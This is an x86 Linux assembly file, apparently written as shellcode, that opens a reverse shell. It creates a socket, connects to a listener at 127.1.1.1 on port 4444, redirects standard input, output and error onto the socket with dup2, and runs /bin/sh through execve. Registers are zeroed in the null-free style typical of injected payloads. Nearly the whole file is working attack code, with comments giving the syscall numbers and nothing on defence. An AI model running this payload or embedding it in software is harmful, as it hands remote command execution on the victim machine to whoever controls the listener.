section .text
global main

main:
    ; clear all used registers
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    ; socket (2,1,0) unistd_32.h = 359 = 167(16)
    ; edx already is 0
    mov ax,0x167
    mov bl, 0x2
    mov cl, 0x1
    int 0x80
    mov ebx, eax ; return val with socket number

    ; connect structre
    push 0x0101017F     ; inet_addr
    push word 0x5C11         ; port 4444 115C
    push word 0x2            ; inet family - 2

    ; connect unistd_32.h = 362 = 16A(16). ebx has return socket no
    xor eax, eax
    mov ax, 0x16A
    mov ecx, esp
    mov dl, 0x10
    int 0x80

    ; dup2
    xor eax, eax
    xor ecx, ecx
    mov cl, 0x2
    loop:
        mov al, 0x3f
        int 0x80
        dec ecx
        jns loop

    ; execve sh
    xor eax, eax
    mov edx, eax
    mov al,11
    push edx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    mov ecx, edx
    int 0x80
